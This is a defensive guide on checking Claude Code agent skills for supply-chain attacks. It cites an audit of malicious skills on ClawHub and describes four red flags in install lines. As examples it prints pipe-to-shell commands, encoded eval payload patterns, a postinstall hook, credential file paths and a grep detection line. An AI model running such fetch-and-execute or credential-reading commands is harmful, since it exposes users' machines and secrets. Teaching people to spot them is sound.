Claude Code · Skill Supply Chain

Don't install another Claude skill,
until you can read the install line.

A skill is not an app. SKILL.md is an instruction file your agent reads and follows, and most skills ship an install line that runs on your machine, as you, with your keys — before Claude does anything. On ClawHub, the only agent-skill hub anyone has published an audit of, Koi Security counted 341 malicious skills out of 2,857 — almost 1 in 8. Two steps stop most of it: pick the skill with find-skills instead of browsing, then read the install line for four red flags. Thirty seconds. Fig. 02 ·

the install line, before it runs

1. A pipe straight into a shell

You never see what runs. The server can serve one thing to a browser and another to curl, so “I checked the URL” proves nothing. It also runs as you — same file access, same keys, same tokens.

install line · red flag
curl -fsSL https://example.com/install.sh | bash
wget -qO- https://example.com/i.sh | sh
iwr -useb https://example.com/i.ps1 | iex

What good looks like: the skill tells you to download the script, then run it as a separate step. Two commands instead of one is the whole difference.

2. Anything base64 (or hex, or eval)

There is no legitimate reason for an install step to hide what it says. Encoding is there to get a payload past your eyes and past a reviewer's grep.

install line · red flag
echo aGVsbG8gd29ybGQ= | base64 -d | bash
eval "$(printf '\x63\x75\x72\x6c ...')"
python -c "exec(__import__('base64').b64decode('...'))"

What good looks like: decode it before you decide — base64 -d on its own, with no pipe into a shell.

3. A post-install hook

It runs on npm install / pip install without you typing anything. You think you're fetching a dependency; you're executing the author's code. This is the single most-used route in real package-ecosystem attacks.

package.json
"scripts": { "postinstall": "node ./scripts/setup.js" }

What good looks like: setup you invoke yourself, after you've read it.

4. Anything reaching for credentials

A skill that formats your commits has no business reading your SSH keys. Credential paths in an install script are the payload, not a feature. Pair this with any outbound request and you are looking at exfiltration.

install line · red flag
~/.ssh/id_rsa      ~/.ssh/id_ed25519     ~/.aws/credentials
~/.config/gh/hosts.yml                   ~/.npmrc
security find-generic-password           # macOS keychain
~/.config/gcloud/                        .env

Fig. 03 ·

the thirty-second pass

Open SKILL.md and any install script it points at, then:

terminal · the grep line
grep -nEi 'curl|wget|\| *(ba)?sh|iex|base64|eval|exec\(|postinstall|preinstall|\.ssh|credentials|keychain|\.npmrc|\.env' SKILL.md install.sh

Nothing back? Install it. Something back? Read that line and decide — some are fine in context (a skill that is a deploy tool will legitimately touch credentials, and should say so in plain words at the top). The rule that survives every case: if the install step hides what it does, that is the finding. You do not need to prove intent.

Read this caveat

ClawHub is the skill hub for OpenClaw. It is the hub that got audited, and the almost-1-in-8 rate is its rate. Nobody has published an equivalent audit of the Claude skills directory, so that figure is not a measured rate for the skills you install — it is the best evidence anyone has about what an unaudited agent-skill hub looks like when someone finally looks. Treat it as a reason to check, not as a statistic about Claude.
